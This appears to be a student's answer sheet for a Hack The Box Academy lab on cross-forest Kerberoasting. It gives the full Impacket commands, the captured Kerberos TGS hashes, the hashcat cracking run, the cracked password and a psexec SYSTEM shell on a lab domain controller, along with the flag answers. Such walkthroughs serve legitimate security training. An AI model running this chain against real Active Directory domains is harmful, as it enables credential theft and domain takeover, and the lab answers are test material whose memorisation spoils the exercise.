# Section 31: Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

Module: 13. Active Directory Enumeration & Attacks

---

## Questions & Answers

### 1. Kerberoast across the forest trust from the Linux attack host. Submit the name of another account with an SPN aside from MSSQLsvc.

Context:
```bash
┌─[htb-student@ea-attack01]─[~]
└──╼ $GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               
HTTP/sapsso.FREIGHTLOGISTICS.LOCAL   sapsso    CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-04-07 17:34:17.571500  <never>               
```

**Answer:** `sapsso`

---

### 2. Crack the TGS and submit the cleartext password as your answer.

Context:
```bash
┌─[htb-student@ea-attack01]─[~]
└──╼ $GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               
HTTP/sapsso.FREIGHTLOGISTICS.LOCAL   sapsso    CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-04-07 17:34:17.571500  <never>               



$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$e796b94d2a208e2edf6466e60bb3aec1$3b09d6824eae2e76044ae410b28c14b8ff05d280777ac42b86a7894386629b6c156526b80f8f015dc3f7c42a033464730d1906962dc875a626c42a42eebef86934d4d9ccf22bf5d4c7d322cd958a292df224cbfa62492b4fc9445c2c800eb89be837c839f227c09fa612de9fd1d93ae21aa3badb1bba2ac75df2716efde22c95c6e87317cfb551447ab684aabd66da9384d3fcb5670d02a3a3b05d240765d9f1c1fef522ca60dda0cafacc34e41f5aa547c62aa87cab6429ad7fac9c478a8ae17b84e2f8bd720a4022be1cc84f515f334a5a1c2a8abe04310d8aab123cfdaa24760021587b8a29f67e78d1d9febce4db7fb7a9ba629d46453d75846a4487d36f12cb63ce2998605c2ca21de348d19936582dc2cac8e14770dd243185e8800497d4c9a6e0e87d9a910b70f44fbba9482514639259e2835446dc36e63455482e70decd1aef51e718eedb887d5815fb098639f247f9d2ec7b5e166415b9ba9e467d8ccc52b7f6b9cb27170d26fe387c80334600b19bc27b96d813d53ce277b41b1c786d45799b61672b8a4fb64b23d9ebf160b570ca9a6f9e0cff367c6fe68628c20e3c4a181688e878725500b296cd0fd9e4e8d95ff1be9d05db16e1dcb68dca8fa336c2cd102f8500c18c79f2b80d6b4ec29574a447045c4449ef61b0ecfae28e55e55e52f142f19bcd8dab6e4eeb5acffa667ed4ce06d6aad008e7ff3c4345b03fd10baf8b87d620c1a0a67fcee275879eb599e67b3a7b398e50219d40896b61f248e3e0e096ee46387eb06ee8869e75df9e1a9014c9150e00498a6404857c078ebdd24cd76669d25436da2c602479f0fe690539d2f13b4bb06ec9b1ef304fe4958c278268c72441ca6fd77b26b5abfbfce8bfb281882a9e485031b6d0d4234c84bf5d21e3ee70b1e828141658dbd2e240bc89877ba665d4e1a296a03178aaae42d9ea4e4d2c575fb7f91f2d0c53ca710e4124877891bc2010c6405a69a646376acaa9b933085c7f446c6548761ddf058d16321f2c87204da8b4dcf38abe3c7f9eab6ccc93e4a0dc15aba51f49aa06ebfdd9cf5fdb1d79c4c37339c0367f73fa823ca9d41d524d1ef91031d85081131132e7d901f24c29a0debff2e57d090e427df158e9aad24739efc980be132de12d9ce554b4f0242c73d3b513546c6f967e695d11564cc2309963257f0dfbbf4009c3d37b8c43d2c6c1e9851bf10210eaed328d75df02e78d3dca14e6a219fa06d6e573a5890433be501c1c11e279fa32482d81c1aeafbc9b8f49d8bd1e0ccd633e66b3dac41e07bfebd47352752de75161fd201eff54408ec15d46dbcb15bd0375ae8368a32fd24dcb10137f8d9f548e4e98ad06c38b93576d7543679fee41450e65a80d96733ba6e0469c7dabb7b725af1274a1466dd30221fea5557f3e67d24fdde0c9ad138a7630bf520578f30d059b368fe8fc4af21e45
$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$9671e61faecf608785744d8942a41662$f6008e9a6bba1d5dcd6198b2dafdb2dd4b4eb7df9e01d4ce4e8dbc9ecfdc916c9496d841d1635cd61df8c3d7ff810e2c9cf2ffce8ce1e9ce03b7b35e6d87937a2e55f95928c0dfc9463ff986ea6c01f339f6019ab95e7327283f110181c85a9ddc0b5c805a314068281e86668e8615455e67c030beda1ad5182b7668abb566f40ddcbece6a3f7fbc130bb3ccaa24962f8d78702e9338321f57f5bad3e9505057b2f31724710837711aba4cb91adbc43d679576b9caea23b6a43cbf46f5092de2bbc303ab7598244bd06326eb044954895da727151ba29fb986c97ba66fb3281e94677a97acd8c68305156f0d0c8e1e890f6af22610513dbf8187546e750246f1e642df2f336c19c5de0c6dd507815b96ea3c9a29d396a80857e77d3686528492776eeff4407fb5dc3a5b1e75a54eeb4d71e75f15bb4c7907409b81283660b947d0d221f8037aa6bd14139d8fe8f1df35f766a4790cbdf254f306b91a028c35d5b0277392082363e56b03b0066b2767f645ba8f3c3e41b3dbb69406951abcf9d7d4e4125a2d8eece63fb6dc12ed693b3b5cb7cd7c9b2aae38d7a138a10700a061d30daeaff1b60d728b42b649800df001b0e1313dc182e5e5e79ab186d3aaee16fc4e849592c28d97e3ee1e33c7fe8736d850e8f2599d05512eee8e4383a59221bc2dfda700bb9b3e2e6a4899d3bd72c5b576cde52b12e3d7dcfe22be19db30f74e4342c6cb151767fae7a21873074e47b998dde215e5102306c473c52cc705c301c7fc78f49e41c0b2c0b75e59fc61e2db3f6122a431bdc349fb3855004fb7d844bdf8bc163e0e1fe381d092a4d2af2945e40b036715effb307019e7429fb0a5bd92be0fd30c18c6fa7da804a42094d655c8ee719a343c8380584dfe3ddcd1e9b96f2e5b85d133be22bac4549fd4ad94e6cb18c88f82c7343005d71f89955f536345cf2c7b8aaf7169778597e5fa4742768f8a840d1e24d9ec371eae0265e2b9d33cce65b0bd1fe8621d10c776200cb6983df641d2cc7f357ffd4a3ba627c40a8edf2e9281f3a9773747371a62fa495f0c28629d089291313342514d3cccd51dce617dc1efbff5e5f3514da2f3f9820e1bc1e974429097c1a84653ee23f0deeb68c498b368faa6f2e303a3f02fe172f34e6aed5f4a458bf77deba5005dbf3a1616107c83554bb5dd83c12ac689afdf8a100773cf9021181fa0e539060f2973ba8df7fe2adfc097118967a3b08e13997d31fad85ecc428048a947295b7d416e0350c95445794bc00dc7a1d6bf5c8abfd7ef380dc3d19dbafea06f9309cc8e83eb13d4e5e7c470c621c7a0d1bf8a2e0634c28c5e7cbc7f9005ee9c76cc54a0ad4b76b73e3eb4940086f432bb6d2c4814cf4218354d4385dab4939dc1b2898af19fa38a1979ac6771f04e548ea689fb17d2535ecc9701fe2d97d3185efe96208117e06f1b237274bc75
```
```bash
┌─[eu-academy-2]─[10.10.15.191]─[htb-ac-2162140@htb-ru5kcueavg-htb-cloud-com]─[~]
└──╼ [★]$ hashcat -m 13100 tgs /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC-Milan Processor, 3844/7752 MB (969 MB allocatable), 4MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================================
* Device #2: cpu-haswell-AMD EPYC-Milan Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$9671e61faecf608785744d8942a41662$f6008e9a6bba1d5dcd6198b2dafdb2dd4b4eb7df9e01d4ce4e8dbc9ecfdc916c9496d841d1635cd61df8c3d7ff810e2c9cf2ffce8ce1e9ce03b7b35e6d87937a2e55f95928c0dfc9463ff986ea6c01f339f6019ab95e7327283f110181c85a9ddc0b5c805a314068281e86668e8615455e67c030beda1ad5182b7668abb566f40ddcbece6a3f7fbc130bb3ccaa24962f8d78702e9338321f57f5bad3e9505057b2f31724710837711aba4cb91adbc43d679576b9caea23b6a43cbf46f5092de2bbc303ab7598244bd06326eb044954895da727151ba29fb986c97ba66fb3281e94677a97acd8c68305156f0d0c8e1e890f6af22610513dbf8187546e750246f1e642df2f336c19c5de0c6dd507815b96ea3c9a29d396a80857e77d3686528492776eeff4407fb5dc3a5b1e75a54eeb4d71e75f15bb4c7907409b81283660b947d0d221f8037aa6bd14139d8fe8f1df35f766a4790cbdf254f306b91a028c35d5b0277392082363e56b03b0066b2767f645ba8f3c3e41b3dbb69406951abcf9d7d4e4125a2d8eece63fb6dc12ed693b3b5cb7cd7c9b2aae38d7a138a10700a061d30daeaff1b60d728b42b649800df001b0e1313dc182e5e5e79ab186d3aaee16fc4e849592c28d97e3ee1e33c7fe8736d850e8f2599d05512eee8e4383a59221bc2dfda700bb9b3e2e6a4899d3bd72c5b576cde52b12e3d7dcfe22be19db30f74e4342c6cb151767fae7a21873074e47b998dde215e5102306c473c52cc705c301c7fc78f49e41c0b2c0b75e59fc61e2db3f6122a431bdc349fb3855004fb7d844bdf8bc163e0e1fe381d092a4d2af2945e40b036715effb307019e7429fb0a5bd92be0fd30c18c6fa7da804a42094d655c8ee719a343c8380584dfe3ddcd1e9b96f2e5b85d133be22bac4549fd4ad94e6cb18c88f82c7343005d71f89955f536345cf2c7b8aaf7169778597e5fa4742768f8a840d1e24d9ec371eae0265e2b9d33cce65b0bd1fe8621d10c776200cb6983df641d2cc7f357ffd4a3ba627c40a8edf2e9281f3a9773747371a62fa495f0c28629d089291313342514d3cccd51dce617dc1efbff5e5f3514da2f3f9820e1bc1e974429097c1a84653ee23f0deeb68c498b368faa6f2e303a3f02fe172f34e6aed5f4a458bf77deba5005dbf3a1616107c83554bb5dd83c12ac689afdf8a100773cf9021181fa0e539060f2973ba8df7fe2adfc097118967a3b08e13997d31fad85ecc428048a947295b7d416e0350c95445794bc00dc7a1d6bf5c8abfd7ef380dc3d19dbafea06f9309cc8e83eb13d4e5e7c470c621c7a0d1bf8a2e0634c28c5e7cbc7f9005ee9c76cc54a0ad4b76b73e3eb4940086f432bb6d2c4814cf4218354d4385dab4939dc1b2898af19fa38a1979ac6771f04e548ea689fb17d2535ecc9701fe2d97d3185efe96208117e06f1b237274bc75:pabloPICASSO
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTL...74bc75
Time.Started.....: Thu Aug 20 23:45:30 2026 (3 secs)
Time.Estimated...: Thu Aug 20 23:45:33 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1915.0 kH/s (0.74ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4843520/14344385 (33.77%)
Rejected.........: 0/4843520 (0.00%)
Restore.Point....: 4841472/14344385 (33.75%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: pac2big -> paafors

Started: Thu Aug 20 23:45:29 2026
Stopped: Thu Aug 20 23:45:34 2026
```

**Answer:** `pabloPICASSO`

---

### 3. Log in to the ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL Domain Controller using the Domain Admin account password submitted for question #2 and submit the contents of the flag.txt file on the Administrator desktop.

Context:
```bash
┌─[htb-student@ea-attack01]─[~]
└──╼ $psexec.py FREIGHTLOGISTICS.LOCAL/sapsso:pabloPICASSO@ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file tdzwppLV.exe
[*] Opening SVCManager on ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL.....
[*] Creating service xXIQ on ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL.....
[*] Starting service xXIQ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt
burn1ng_d0wn_th3_f0rest!
C:\Windows\system32>
```

**Answer:** `burn1ng_d0wn_th3_f0rest!`

---


[Back to Module Index](./README.md)
